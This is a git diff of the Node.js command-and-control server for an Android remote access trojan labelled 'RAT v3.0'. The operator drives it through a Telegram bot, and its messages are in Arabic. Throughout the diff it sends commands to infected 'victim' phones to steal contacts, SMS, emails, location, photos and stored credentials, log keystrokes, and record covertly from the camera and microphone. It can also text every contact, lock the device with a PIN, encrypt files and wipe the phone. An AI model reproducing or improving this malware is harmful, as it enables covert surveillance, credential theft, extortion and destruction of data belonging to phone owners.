-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: '🗂️ الملفات والصور', callback_data: `files_menu:${uuid}:` }],
-                        [{ text: '📱 معلومات الجهاز', callback_data: `device_info:${uuid}:` },
-                         { text: '📋 الحافظة', callback_data: `clipboard:${uuid}:` }],
-                        [{ text: '📞 جهات الاتصال', callback_data: `contacts:${uuid}:` },
-                         { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}:` }],
-                        [{ text: '💬 جميع الرسائل', callback_data: `messages:${uuid}:` },
-                         { text: '📧 البريد الإلكتروني', callback_data: `emails:${uuid}:` }],
-                        [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}:` },
-                         { text: '📍 الموقع', callback_data: `location:${uuid}:` }],
-                        [{ text: '🎤 تسجيل ميكروفون', callback_data: `microphone:${uuid}:` }],
-                        [{ text: '📸 كاميرا خلفية', callback_data: `camera_main:${uuid}:` },
-                         { text: '🤳 كاميرا أمامية', callback_data: `camera_selfie:${uuid}:` }],
-                        [{ text: '🖥️ لقطة شاشة', callback_data: `screenshot:${uuid}:` }],
-                        [{ text: '💳 سحب الحسابات', callback_data: `credentials:${uuid}:` }],
-                        [{ text: '🔔 مراقبة الإشعارات', callback_data: `notifications:${uuid}:` }],
-                        [{ text: '⌨️ مراقبة الكتابة (Keylogger)', callback_data: `keylogger:${uuid}:` }],
-                        [{ text: '🔊 تشغيل صوت', callback_data: `play_audio_menu:${uuid}:` },
-                         { text: '🔇 إيقاف الصوت', callback_data: `stop_audio:${uuid}:` }],
-                        [{ text: '📨 إرسال رسالة', callback_data: `send_message:${uuid}:` }],
-                        [{ text: '📨 رسالة للجميع', callback_data: `send_message_to_all:${uuid}:` }],
-                        [{ text: '🔗 فتح رابط', callback_data: `open_url:${uuid}:` }],
-                        [{ text: '📲 إظهار إشعار', callback_data: `show_notification:${uuid}:` }],
-                        [{ text: '💬 إظهار Toast', callback_data: `toast:${uuid}:` }],
-                        [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}:` }],
-                        [{ text: '🔒 قفل الجهاز', callback_data: `lock_device:${uuid}:` }],
-                        [{ text: '🔐 تشفير الملفات', callback_data: `encrypt:${uuid}:` }],
-                        [{ text: '💣 فرمته الجهاز', callback_data: `format:${uuid}:` }],
-                        [{ text: '🔙 رجوع', callback_data: `back_to_devices:${uuid}:` }]
-                    ]
-                },
-                parse_mode: 'HTML'
-            }
-        );
-    }
-
-    if (prefix == 'files_menu') {
-        appBot.editMessageText(
-            `📂 <b>قائمة الملفات والصور</b>\n━━━━━━━━━━━━━━`,
-            {
-                chat_id: id,
-                message_id: msg.message_id,
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: '🖼️ سحب جميع الصور', callback_data: `get_all_photos:${uuid}:` }],
-                        [{ text: '📥 تنزيل ملف', callback_data: `file:${uuid}:` }],
-                        [{ text: '🗑️ حذف ملف', callback_data: `delete_file:${uuid}:` }],
-                        [{ text: '🔙 رجوع', callback_data: `device:${uuid}:` }]
-                    ]
-                },
-                parse_mode: 'HTML'
-            }
-        );
-    }
-
-    // ===== تنفيذ الأوامر =====
-    const actionHandlers = {
-        'device_info': { cmd: 'device_info', msg: '⏳ جاري سحب معلومات الجهاز...' },
-        'clipboard': { cmd: 'clipboard', msg: '⏳ جاري سحب الحافظة...' },
-        'contacts': { cmd: 'contacts', msg: '⏳ جاري سحب جهات الاتصال...' },
-        'calls': { cmd: 'calls', msg: '⏳ جاري سحب سجل المكالمات...' },
-        'messages': { cmd: 'messages', msg: '⏳ جاري سحب جميع الرسائل...' },
-        'emails': { cmd: 'emails', msg: '⏳ جاري سحب البريد الإلكتروني...' },
-        'apps': { cmd: 'apps', msg: '⏳ جاري سحب التطبيقات...' },
-        'location': { cmd: 'location', msg: '⏳ جاري سحب الموقع...' },
-        'screenshot': { cmd: 'screenshot', msg: '⏳ جاري التقاط الشاشة...' },
-        'credentials': { cmd: 'credentials', msg: '⏳ جاري سحب الحسابات...' },
-        'vibrate': { cmd: 'vibrate', msg: '📳 جاري تشغيل الاهتزاز...' },
-        'stop_audio': { cmd: 'stop_audio', msg: '🔇 جاري إيقاف الصوت...' },
-        'encrypt': { cmd: 'encrypt', msg: '🔐 جاري تشفير الملفات...' },
-        'format': { cmd: 'format', msg: '💣 <b>جارٍ فرمتة الجهاز...</b>\n⚠️ هذا الإجراء لا يمكن التراجع عنه!', danger: true },
-        'get_all_photos': { cmd: 'get_all_photos', msg: '⏳ جاري سحب جميع الصور...' },
-        'keylogger': { cmd: 'keylogger', msg: '⌨️ تم تفعيل مراقبة الكتابة...' },
-        'notifications': { cmd: 'notifications', msg: '🔔 تم تفعيل مراقبة الإشعارات...' },
-        'camera_main': { cmd: 'capture_main', msg: '📸 جاري التقاط صورة من الكاميرا الخلفية...' },
-        'camera_selfie': { cmd: 'capture_selfie', msg: '📸 جاري التقاط صورة من الكاميرا الأمامية...' }
-    };
-
-    if (actionHandlers[prefix]) {
-        const action = actionHandlers[prefix];
-        if (action.danger) {
-            // تأكيد للإجراءات الخطيرة
-            appBot.editMessageText(
-                `⚠️ <b>تأكيد الإجراء</b>\n━━━━━━━━━━━━━━\n${action.msg}\n\n<b>هل أنت متأكد؟</b>`,
-                {
-                    chat_id: id,
-                    message_id: msg.message_id,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '✅ نعم، متأكد', callback_data: `confirm_${prefix}:${uuid}:` }],
-                            [{ text: '❌ إلغاء', callback_data: `device:${uuid}:` }]
-                        ]
-                    },
-                    parse_mode: 'HTML'
+            else if (msg.startsWith('location:')) {
+                const parts = msg.split(':');
+                if (parts.length >= 3) {
+                    bot.sendLocation(adminId, parseFloat(parts[1]), parseFloat(parts[2]));
+                    bot.sendMessage(adminId, `📍 موقع <b>${model}</b>`, { parse_mode: 'HTML' });
                 }
-            );
-        } else {
-            sendCommandToClient(`${action.cmd}:`);
-            appBot.deleteMessage(id, msg.message_id);
-            showMainMenu(action.msg);
+            }
+            else if (msg == 'done' || msg == 'ok') {
+                // تأكيد تنفيذ الأمر
+            }
+            else {
+                // أي رسالة أخرى
+                bot.sendMessage(adminId,
+                    `📩 من <b>${model}</b>:\n<code>${msg.substring(0, 500)}</code>`,
+                    { parse_mode: 'HTML' }
+                );
+            }
+        } catch (e) {
+            console.error('WebSocket error:', e.message);
         }
-        return;
-    }
-
-    // تأكيد الإجراءات الخطيرة
-    if (prefix.startsWith('confirm_')) {
-        const realAction = prefix.replace('confirm_', '');
-        if (actionHandlers[realAction]) {
-            sendCommandToClient(`${actionHandlers[realAction].cmd}:`);
-            appBot.deleteMessage(id, msg.message_id);
-            showMainMenu(actionHandlers[realAction].msg);
-        }
-        return;
-    }
-
-    // ===== أوامر تتطلب إدخال نص =====
-    const inputActions = {
-        'microphone': { msg: '🎤 أدخل المدة (بالثواني) التي تريد تسجيل الميكروفون فيها\n⚠️ الحد الأقصى: 300 ثانية (5 دقائق)' },
-        'video_main': { msg: '📷 أدخل المدة (بالثواني) لتسجيل الكاميرا الخلفية\n⚠️ الحد الأقصى: 60 ثانية' },
-        'video_selfie': { msg: '🤳 أدخل المدة (بالثواني) لتسجيل الكاميرا الأمامية\n⚠️ الحد الأقصى: 60 ثانية' },
-        'toast': { msg: '💬 أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n⚠️ ستظهر لمدة قصيرة ثم تختفي' },
-        'file': { msg: '📁 أدخل مسار الملف الذي تريد تنزيله\n📌 مثال: /storage/emulated/0/DCIM/Camera/photo.jpg' },
-        'delete_file': { msg: '🗑️ أدخل مسار الملف الذي تريد حذفه\n📌 مثال: /storage/emulated/0/DCIM/Camera/photo.jpg' },
-        'send_message': { msg: '°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه\n📌 مثال: 05XXXXXXXX (للسعودية)' },
-        'send_message_to_all': { msg: '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال' },
-        'play_audio': { msg: '🔊 أدخل رابط الصوت الذي تريد تشغيله\n📌 مثال: https://example.com/audio.mp3' },
-        'open_url': { msg: '🔗 أدخل الرابط الذي تريد فتحه على جهاز الضحية\n📌 مثال: https://example.com' },
-        'show_notification': { msg: '°• أدخل عنوان الإشعار الذي تريد إرساله\n📌 مثال: تحديث النظام' },
-        'lock_device': { msg: '🔒 أدخل رمز القفل المكون من 4 أرقام\n📌 مثال: 1234' }
-    };
-
-    if (inputActions[prefix]) {
-        const action = inputActions[prefix];
-        appBot.deleteMessage(id, msg.message_id);
-        appBot.sendMessage(id, action.msg, { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-        return;
-    }
-
-    // ===== أزرار العودة =====
-    if (prefix == 'back_to_devices') {
-        const inlineButtons = [];
-        appClients.forEach(function(client, uuid) {
-            inlineButtons.push([
-                { text: `${client.model} (🔋${client.battery}%)`, callback_data: 'device:' + uuid }
-            ]);
-        });
-        appBot.editMessageText('⚙️ <b>اختر الجهاز للتحكم به:</b>', {
-            chat_id: id,
-            message_id: msg.message_id,
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: inlineButtons }
-        });
-    }
+    });
 });
 
 // =============== دوال مساعدة ===============
-function sendCommandToClient(command) {
-    appSocket.clients.forEach(function(socket) {
-        if (socket.uuid == currentUuid) {
-            try {
-                socket.send(command);
-                console.log(`📤 أرسل: ${command} إلى ${socket.uuid}`);
-            } catch (e) {
-                console.error('❌ فشل الإرسال:', e.message);
-            }
-        }
-    });
+function sendSuccess(chatId, msg) {
+    bot.sendMessage(chatId, `✅ ${msg}`, { parse_mode: 'HTML' });
 }
 
-function showMainMenu(message) {
-    appBot.sendMessage(id,
-        `${message}\n\n` +
-        `━━━━━━━━━━━━━━\n` +
-        `<b>القائمة الرئيسية:</b>`,
+function sendCmd(uuid, cmd) {
+    const client = clients.get(uuid);
+    if (client && client.ws && client.ws.readyState === 1) {
+        client.ws.send(cmd);
+        console.log(`📤 أرسل ${cmd} إلى ${client.model}`);
+        return true;
+    }
+    return sendCmdHttp(uuid, cmd);
+}
+
+async function sendCmdHttp(uuid, cmd) {
+    // محاولة HTTP API
+    const client = clients.get(uuid);
+    if (client && client.httpUrl) {
+        try {
+            await axios.post(client.httpUrl + '/cmd', { cmd });
+            return true;
+        } catch (e) {}
+    }
+    return false;
+}
+
+function showMainMenu(msg) {
+    bot.sendMessage(adminId,
+        `${msg}\n━━━━━━━━━━━━━━\n<b>القائمة الرئيسية:</b>`,
         {
             parse_mode: 'HTML',
             reply_markup: {
@@ -751,37 +365,325 @@ function showMainMenu(message) {
     );
 }
 
-// =============== كشف الاتصال (Ping) ===============
-setInterval(function() {
-    appSocket.clients.forEach(function(socket) {
-        try {
-            socket.send('ping');
-        } catch (e) {
-            // تجاهل الأخطاء
+// =============== معالجة أوامر البوت ===============
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text || '';
+
+    // التحقق من الصلاحية
+    if (chatId != adminId) {
+        bot.sendMessage(chatId, '❌ غير مصرح');
+        return;
+    }
+
+    // ===== معالجة الردود =====
+    if (msg.reply_to_message) {
+        const replyText = msg.reply_to_message.text || '';
+        
+        if (replyText.includes('أدخل الرقم')) {
+            state.number = text;
+            bot.sendMessage(adminId, '💬 أدخل الرسالة:', { reply_markup: { force_reply: true } });
+            return;
+        }
+        if (replyText.includes('أدخل الرسالة:') && state.number) {
+            sendCmd(state.uuid, `send_sms:${state.number}:${text}`);
+            state.number = '';
+            state.uuid = '';
+            showMainMenu('✅ تم إرسال الرسالة!');
+            return;
+        }
+        if (replyText.includes('رسالة للجميع')) {
+            sendCmd(state.uuid, `broadcast:${text}`);
+            state.uuid = '';
+            showMainMenu('✅ تم إرسال للجميع!');
+            return;
+        }
+        if (replyText.includes('مسار الملف')) {
+            sendCmd(state.uuid, `get_file:${text}`);
+            state.uuid = '';
+            showMainMenu('⏳ جاري تحميل الملف...');
+            return;
+        }
+        if (replyText.includes('حذف الملف')) {
+            sendCmd(state.uuid, `del_file:${text}`);
+            state.uuid = '';
+            showMainMenu('✅ تم حذف الملف!');
+            return;
+        }
+        if (replyText.includes('المدة بالثواني')) {
+            sendCmd(state.uuid, `record:${text}`);
+            state.uuid = '';
+            showMainMenu(`🎤 جاري التسجيل ${text} ثانية...`);
+            return;
+        }
+        if (replyText.includes('الرابط')) {
+            sendCmd(state.uuid, `open:${text}`);
+            state.uuid = '';
+            showMainMenu('✅ تم فتح الرابط!');
+            return;
+        }
+        if (replyText.includes('رمز القفل')) {
+            sendCmd(state.uuid, `lock:${text}`);
+            state.uuid = '';
+            showMainMenu(`🔒 تم القفل بالرمز ${text}!`);
+            return;
+        }
+        if (replyText.includes('عنوان الإشعار')) {
+            state.title = text;
+            bot.sendMessage(adminId, '📝 أدخل محتوى الإشعار:', { reply_markup: { force_reply: true } });
+            return;
+        }
+        if (replyText.includes('محتوى الإشعار')) {
+            sendCmd(state.uuid, `notify:${state.title}|${text}`);
+            state.title = '';
+            state.uuid = '';
+            showMainMenu('✅ تم إرسال الإشعار!');
+            return;
+        }
+    }
+
+    // ===== الأوامر الرئيسية =====
+    if (text == '/start') {
+        showMainMenu('👋 مرحبا في بوت الاختراق v3.0\n\n' +
+            '🆕 <b>الإمكانيات الجديدة:</b>\n' +
+            '• ⌨️ Keylogger (قراءة كل ما يكتب)\n' +
+            '• 🔔 مراقبة الإشعارات\n' +
+            '• 📧 سحب البريد الإلكتروني\n' +
+            '• 💳 سحب الحسابات\n' +
+            '• 🔐 تشفير الملفات\n' +
+            '• 💣 فرمته الجهاز\n' +
+            '• 🔒 قفل الجهاز برمز\n' +
+            '• 🔗 فتح رابط مباشر');
+    }
+    else if (text == '📱 الأجهزة المتصلة') {
+        if (clients.size == 0) {
+            bot.sendMessage(adminId, '❌ لا توجد أجهزة متصلة!\n⚠️ تأكد من تثبيت التطبيق على جهاز الضحية');
+        } else {
+            let list = '📱 <b>الأجهزة المتصلة:</b>\n━━━━━━━━━━━━━━\n';
+            clients.forEach((c, uid) => {
+                list += `• <b>${c.model}</b> 🔋${c.battery}%\n  🆔 <code>${uid.substring(0, 8)}</code>\n`;
+            });
+            bot.sendMessage(adminId, list, { parse_mode: 'HTML' });
+        }
+    }
+    else if (text == '⚙️ لوحة التحكم') {
+        if (clients.size == 0) {
+            bot.sendMessage(adminId, '❌ لا توجد أجهزة متصلة!');
+        } else {
+            const buttons = [];
+            clients.forEach((c, uid) => {
+                buttons.push([{ text: `📱 ${c.model} 🔋${c.battery}%`, callback_data: `ctrl:${uid}` }]);
+            });
+            bot.sendMessage(adminId, '⚙️ <b>اختر جهاز:</b>', {
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: buttons }
+            });
+        }
+    }
+    else if (text == '📊 الإحصائيات') {
+        bot.sendMessage(adminId,
+            `📊 <b>إحصائيات</b>\n` +
+            `• الأجهزة: ${clients.size}\n` +
+            `• الحالة: ✅ نشط\n` +
+            `• 🕐 ${new Date().toLocaleString('ar-EG')}`,
+            { parse_mode: 'HTML' }
+        );
+    }
+});
+
+// =============== معالجة الأزرار ===============
+bot.on('callback_query', async (cq) => {
+    const msg = cq.message;
+    const data = cq.callback_query.data || cq.data;
+    const [action, uuid, extra] = (data || '').split(':');
+
+    if (!action || !uuid) return;
+
+    const client = clients.get(uuid);
+    if (!client) {
+        bot.answerCallbackQuery(cq.id || cq.callback_query?.id, { text: '❌ الجهاز غير متصل!', show_alert: true });
+        return;
+    }
+
+    // قائمة الأوامر السريعة
+    const quickCmds = {
+        'info': 'device_info',
+        'contacts': 'get_contacts',
+        'calls': 'get_calls',
+        'sms': 'get_sms',
+        'emails': 'get_emails',
+        'apps': 'get_apps',
+        'clipboard': 'get_clipboard',
+        'location': 'get_location',
+        'screenshot': 'capture_screen',
+        'credentials': 'get_credentials',
+        'keylogger_on': 'keylogger_start',
+        'keylogger_off': 'keylogger_stop',
+        'notif_on': 'notif_start',
+        'notif_off': 'notif_stop',
+        'vibrate': 'do_vibrate',
+        'stop_audio': 'audio_stop',
+        'encrypt': 'do_encrypt',
+        'format': 'do_format',
+        'camera_main': 'photo_main',
+        'camera_selfie': 'photo_selfie',
+        'photos': 'list_photos'
+    };
+
+    if (quickCmds[action]) {
+        sendCmd(uuid, quickCmds[action]);
+        bot.deleteMessage(adminId, msg.message_id);
+        showMainMenu(`⏳ جاري تنفيذ ${action}...`);
+        return;
+    }
+
+    // أوامر تتطلب إدخال
+    if (action == 'ctrl') {
+        showDeviceMenu(msg, uuid, client);
+    }
+    else if (action == 'send_sms') {
+        state.uuid = uuid;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId, '📱 أدخل الرقم:', { reply_markup: { force_reply: true } });
+    }
+    else if (action == 'broadcast') {
+        state.uuid = uuid;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId, '💬 أدخل رسالة للجميع:', { reply_markup: { force_reply: true } });
+    }
+    else if (action == 'get_file' || action == 'del_file') {
+        state.uuid = uuid;
+        state.message = action;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId,
+            action == 'get_file' ? '📁 أدخل مسار الملف:' : '🗑️ أدخل مسار الملف للحذف:',
+            { reply_markup: { force_reply: true } }
+        );
+    }
+    else if (action == 'record_mic') {
+        state.uuid = uuid;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId, '🎤 أدخل المدة بالثواني (1-300):', { reply_markup: { force_reply: true } });
+    }
+    else if (action == 'record_vid_main' || action == 'record_vid_selfie') {
+        state.uuid = uuid;
+        state.message = action;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId, '🎥 أدخل المدة بالثواني (1-60):', { reply_markup: { force_reply: true } });
+    }
+    else if (action == 'open_url') {
+        state.uuid = uuid;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId, '🔗 أدخل الرابط:', { reply_markup: { force_reply: true } });
+    }
+    else if (action == 'lock_device') {
+        state.uuid = uuid;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId, '🔒 أدخل رمز القفل (4 أرقام):', { reply_markup: { force_reply: true } });
+    }
+    else if (action == 'notify') {
+        state.uuid = uuid;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId, '📌 أدخل عنوان الإشعار:', { reply_markup: { force_reply: true } });
+    }
+    else if (action == 'toast') {
+        state.uuid = uuid;
+        bot.deleteMessage(adminId, msg.message_id);
+        bot.sendMessage(adminId, '💬 أدخل نص الـ Toast:', { reply_markup: { force_reply: true } });
+    }
+    else if (action == 'back') {
+        showDeviceList(msg);
+    }
+    else if (action == 'confirm_format') {
+        sendCmd(uuid, 'do_format');
+        bot.deleteMessage(adminId, msg.message_id);
+        showMainMenu('💣 جاري فرمتة الجهاز...');
+    }
+    else if (action == 'confirm_encrypt') {
+        sendCmd(uuid, 'do_encrypt');
+        bot.deleteMessage(adminId, msg.message_id);
+        showMainMenu('🔐 جاري تشفير الملفات...');
+    }
+});
+
+// =============== عرض قائمة الجهاز ===============
+function showDeviceMenu(msg, uuid, client) {
+    const dangerStyle = (text, action) => ({ text, callback_data: `${action}:${uuid}:`, color: 'red' });
+    
+    bot.editMessageText(
+        `⚙️ <b>${client.model}</b>\n🔋 ${client.battery}% | 📶 ${client.provider}\n━━━━━━━━━━━━━━\n<b>اختر الأمر:</b>`,
+        {
+            chat_id: adminId,
+            message_id: msg.message_id,
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: 'ℹ️ معلومات الجهاز', callback_data: `info:${uuid}:` }],
+                    [{ text: '📞 جهات الاتصال', callback_data: `contacts:${uuid}:` },
+                     { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}:` }],
+                    [{ text: '💬 جميع الرسائل', callback_data: `sms:${uuid}:` },
+                     { text: '📧 البريد الإلكتروني', callback_data: `emails:${uuid}:` }],
+                    [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}:` },
+                     { text: '📋 الحافظة', callback_data: `clipboard:${uuid}:` }],
+                    [{ text: '📍 الموقع', callback_data: `location:${uuid}:` },
+                     { text: '📸 لقطة شاشة', callback_data: `screenshot:${uuid}:` }],
+                    [{ text: '🖼️ سحب الصور', callback_data: `photos:${uuid}:` },
+                     { text: '💳 الحسابات', callback_data: `credentials:${uuid}:` }],
+                    [{ text: '📸 كاميرا خلفية', callback_data: `camera_main:${uuid}:` },
+                     { text: '🤳 كاميرا أمامية', callback_data: `camera_selfie:${uuid}:` }],
+                    [{ text: '🎤 تسجيل ميكروفون', callback_data: `record_mic:${uuid}:` }],
+                    [{ text: '🎥 تسجيل فيديو خلفي', callback_data: `record_vid_main:${uuid}:` },
+                     { text: '🎥 تسجيل سيلفي', callback_data: `record_vid_selfie:${uuid}:` }],
+                    [{ text: '📁 تنزيل ملف', callback_data: `get_file:${uuid}:` },
+                     { text: '🗑️ حذف ملف', callback_data: `del_file:${uuid}:` }],
+                    [{ text: '📨 إرسال SMS', callback_data: `send_sms:${uuid}:` },
+                     { text: '📨 رسالة للجميع', callback_data: `broadcast:${uuid}:` }],
+                    [{ text: '🔗 فتح رابط', callback_data: `open_url:${uuid}:` },
+                     { text: '🔒 قفل الجهاز', callback_data: `lock_device:${uuid}:` }],
+                    [{ text: '📲 إشعار', callback_data: `notify:${uuid}:` },
+                     { text: '💬 Toast', callback_data: `toast:${uuid}:` }],
+                    [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}:` },
+                     { text: '🔇 إيقاف صوت', callback_data: `stop_audio:${uuid}:` }],
+                    [{ text: '⌨️ Keylogger ON', callback_data: `keylogger_on:${uuid}:` },
+                     { text: '⌨️ Keylogger OFF', callback_data: `keylogger_off:${uuid}:` }],
+                    [{ text: '🔔 إشعارات ON', callback_data: `notif_on:${uuid}:` },
+                     { text: '🔔 إشعارات OFF', callback_data: `notif_off:${uuid}:` }],
+                    [{ text: '🔐 تشفير الملفات', callback_data: `confirm_encrypt:${uuid}:`, color: 'red' }],
+                    [{ text: '💣 فرمته الجهاز', callback_data: `confirm_format:${uuid}:`, color: 'red' }],
+                    [{ text: '🔙 رجوع', callback_data: `back:${uuid}:` }]
+                ]
+            }
+        }
+    );
+}
+
+function showDeviceList(msg) {
+    const buttons = [];
+    clients.forEach((c, uid) => {
+        buttons.push([{ text: `📱 ${c.model} 🔋${c.battery}%`, callback_data: `ctrl:${uid}` }]);
+    });
+    bot.editMessageText('⚙️ <b>اختر جهاز:</b>', {
+        chat_id: adminId,
+        message_id: msg.message_id,
+        parse_mode: 'HTML',
+        reply_markup: { inline_keyboard: buttons }
+    });
+}
+
+// =============== Ping ===============
+setInterval(() => {
+    clients.forEach((c, uid) => {
+        if (c.ws && c.ws.readyState === 1) {
+            c.ws.send('ping');
+        } else {
+            clients.delete(uid);
         }
     });
-    // محاولة الاتصال بالإنترنت للتأكد
-    try {
-        axios.get(address).then(() => {}).catch(() => {});
-    } catch (e) {}
-}, 5000);
+}, 10000);
 
 // =============== تشغيل الخادم ===============
 const PORT = process.env.PORT || 8999;
-appServer.listen(PORT, () => {
-    console.log(`🚀 RAT Server running on port ${PORT}`);
-    console.log(`🤖 Bot started successfully`);
-    
-    // إشعار بتشغيل البوت
-    appBot.sendMessage(id, 
-        `🚀 <b>تم تشغيل البوت بنجاح!</b>\n` +
-        `━━━━━━━━━━━━━━\n` +
-        `• ⚙️ الإصدار: v3.0 Advanced\n` +
-        `• 🕐 ${new Date().toLocaleString('ar-EG')}\n` +
-        `• 🌐 المنفذ: ${PORT}\n` +
-        `• 👤 المطور: @king_1_4\n` +
-        `━━━━━━━━━━━━━━\n` +
-        `<b>جميع الإمكانيات متاحة ✅</b>`,
-        { parse_mode: 'HTML' }
-    );
+server.listen(PORT, () => {
+    console.log(`🚀 RAT v3.0 على المنفذ ${PORT}`);
+    bot.sendMessage(adminId, `🚀 <b>تم التشغيل!</b>\n🕐 ${new Date().toLocaleString('ar-EG')}`, { parse_mode: 'HTML' });
 });
